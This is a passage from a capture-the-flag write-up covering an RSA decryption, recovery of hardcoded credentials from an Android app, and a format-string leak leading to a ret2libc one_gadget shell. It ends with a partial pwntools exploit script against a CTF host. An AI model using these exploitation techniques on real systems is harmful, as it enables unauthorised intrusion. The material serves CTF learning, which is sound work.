<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">d</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">inverse_mod(e,totient)</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(long_to_bytes(</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">pow</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(c,d,N)))</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><p>And thus we receive the flag:</p><p><code>Let&#39;s meet at Yichun on 30 Feb. On that day, say &#39;DSO-NUS{851f6c328f2da456cbc410184c7ada365c6d1f69199f0f4fdcb9fd43101ce9ee}&#39; to confirm your identity.</code></p><h2 id="login" tabindex="-1">Login <a class="header-anchor" href="#login" aria-label="Permalink to “Login”">​</a></h2><div class="language- line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span>It&#39;s time for a simple, relaxing challenge.</span></span>
<span class="line"><span>Can you find the correct credentials?</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>This was my first foray into Mobile RE. It was rather painful but at least I learnt more about dissecting Android applications.</p><h3 id="reconnaissance-1" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance-1" aria-label="Permalink to “Reconnaissance”">​</a></h3><p>We are presented with an APK file which reveals some interesting code:</p><p><img src="/assets/ddea.CX7rDOsq.png" alt="" data-zoomable="true"><img src="data:image/png;base64,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" alt="" data-zoomable="true"><img src="data:image/png;base64,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" alt="" data-zoomable="true"><img src="/assets/checks.CnMduNpx.png" alt="" data-zoomable="true"><img src="/assets/javapassword.DeS_lCE0.png" alt="" data-zoomable="true"><img src="/assets/aestool.7JGts_b4.png" alt="" data-zoomable="true"></p><p>All from LoginDataSource.java and AESTools.java. The rest were... junk, to say the least.</p><h3 id="making-sense-of-everything" tabindex="-1">Making Sense of Everything. <a class="header-anchor" href="#making-sense-of-everything" aria-label="Permalink to “Making Sense of Everything.”">​</a></h3><p>We seem to need to recover 3 things:</p><ul><li>The <code>user ID</code></li><li>The first 4 characters of the <code>password</code></li><li>The last 8 characters of the <code>password</code>.</li></ul><p>The first two are relatively trivial.</p><p><img src="/assets/userid.DGU0PwQQ.png" alt="" data-zoomable="true"><img src="/assets/first4.pyDlUUf7.png" alt="" data-zoomable="true"></p><p>The only troublesome one was the <code>getNativePassword()</code> function.</p><p>However, upon following, we noticed that there was this <code>ddea.so</code> file (4 different binaries, we selected the ARM 64-bit one). Opening it gives us:</p><p><img src="/assets/getnativepassword.Ck4cfNEs.png" alt="" data-zoomable="true"></p><p>which... OK, it is what we want but... It is pretty intimidating.</p><p>That is... if you <strong>don&#39;t</strong> look at the program graph.</p><p><img src="/assets/xor.CA7FYW8s.png" alt="" data-zoomable="true"></p><p>It is evident that each and every byte is being xorred, from <code>byte_8F0</code> and <code>byte_901</code> to <code>byte_8FF</code> and <code>byte_910</code>. This will give us the key. (Sorry ;^; the screen was way too long)</p><p>So let us see if we can xor them together...</p><p><img src="/assets/recoverkey.CfAIBwP0.png" alt="" data-zoomable="true"></p><p>Bingo. Thus we decrypt the AES ciphertext as:</p><p><img src="/assets/decrypt.DiO0fol5.png" alt="" data-zoomable="true"></p><p>Thus we submit</p><div class="language- line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span>Username: User1337</span></span>
<span class="line"><span>Password: L1v3p2Zzw0rD</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>And receive the flag:</p><p><code>DSO-NUS{71bcade1b51d529ad5c9d23657662901a4be6eb7296c76fecee1e892a2d8af3e}</code></p><h2 id="robust-orbital-postal-service" tabindex="-1">Robust Orbital Postal Service <a class="header-anchor" href="#robust-orbital-postal-service" aria-label="Permalink to “Robust Orbital Postal Service”">​</a></h2><p><code>You managed to break into another one of the imposter&#39;s communication system, named the Robust Orbital Postal Service. This service lets the imposters send messages to one another secretly. Are you able to find out about their secrets?</code></p><h3 id="reconnaissance-2" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance-2" aria-label="Permalink to “Reconnaissance”">​</a></h3><p>Doing the things that we should do in Pwn:</p><p><img src="/assets/checksec.BtL-wdTa.png" alt="" data-zoomable="true"><img src="/assets/ida.C5TwBt_h.png" alt="" data-zoomable="true"></p><p>Also, note that we have a LIBC file:</p><p><img src="data:image/png;base64,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" alt="" data-zoomable="true"></p><h3 id="vulnerability-analysis" tabindex="-1">Vulnerability Analysis <a class="header-anchor" href="#vulnerability-analysis" aria-label="Permalink to “Vulnerability Analysis”">​</a></h3><ul><li><code>printf()</code> without <em>format strings</em> means a <strong>Format String Exploit.</strong></li><li>Unlike the previous FSBS challenge, there is no <code>getflag()</code> function. <ul><li>Unfortunately, there is <em>NX bit</em> up.</li><li>So it has to be a <strong>ret2libc</strong> exploit (at least, that&#39;s what I assumed or this challenge would have been out of my capacity). <ul><li>This is also reasonable considering we are given a <code>custom libc version</code>.</li></ul></li></ul></li><li>PIE implies the need to leak PIE base... or do we?</li></ul><p><strong>Verdict: ret2libc</strong></p><h3 id="the-15-min-exploit-refer-to-script" tabindex="-1">The 15-min Exploit. (Refer to Script) <a class="header-anchor" href="#the-15-min-exploit-refer-to-script" aria-label="Permalink to “The 15-min Exploit. (Refer to Script)”">​</a></h3><p>ret2libc attacks (that I know of) primarily concern themselves with exploiting <code>one_gadgets</code>, which spawns a shell so long as the constraints are met.</p><p>So we will be looking for <code>libc offsets</code> to jump into the <code>one_gadget</code>:</p><p><img src="/assets/libc-offset.CZZXPg9h.png" alt="" data-zoomable="true"></p><p>And the <code>one_gadget</code> itself: <img src="/assets/onegadget.D9Rq_1cM.png" alt="" data-zoomable="true"></p><p>Then, we simply perform your standard ret2libc exploit routine:</p><ol><li>Leak <code>libc base</code> with a known <code>libc</code> function:</li></ol><p><img src="/assets/libcleak.DZ59lg43.png" alt="" data-zoomable="true"></p><p>We are using the <strong>Format String Exploit</strong> from the previous challenge (FSBS).</p><p><img src="/assets/libc-offset.CZZXPg9h.png" alt="" data-zoomable="true"></p><p>Then we look up the custom LIBC offset using LIBC-database.</p><p>In this case, our dear address is given by this line in our script:</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_base</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#8BE9FD;--shiki-dark-font-style:italic;">int</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(r.recvline()[:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">],</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">16</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">243</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">236c0</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Subject to change, of course, due to PIE.</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol start="2"><li>Find our one_gadget address.</li></ol><p>This... requires no explanation. Just use <code>one_gadget</code>. <img src="/assets/onegadget.D9Rq_1cM.png" alt="" data-zoomable="true"></p><p>I used the first one.</p><ol start="3"><li>Lastly, <strong>clear all constraints</strong> as stipulated and jump to the <code>one_gadget</code>.</li></ol><p>Because we are using <code>rax</code>, we can simply terminate the input string (<code>&#39;\0&#39;</code>) to reset it to <code>NULL</code>.</p><p>And just like that we clear our constraints! We spare you the pain of looking at us connect to the server and thus we retrieve the flag:</p><p><code>DSO-NUS{13514e093f9b3c56ed27bad097ea810b27c1e754b7de98d6ff8bc3006f5ab82d}</code></p><h3 id="appendix-the-script" tabindex="-1">Appendix: The Script <a class="header-anchor" href="#appendix-the-script" aria-label="Permalink to “Appendix: The Script”">​</a></h3><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> pwn </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">context.log_level</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">DEBUG</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">#r=process([&quot;./ROPS&quot;],env={&quot;LD_PRELOAD&quot;: &quot;libc.so.6&quot;})</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">remote(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">ctf-jfi4.balancedcompo.site</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">9995</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># ROPS.so.6 in libcdatabase: local-f6cb23f4bb2899adab95d11fc2e5eba3ed1c3266</span></span>
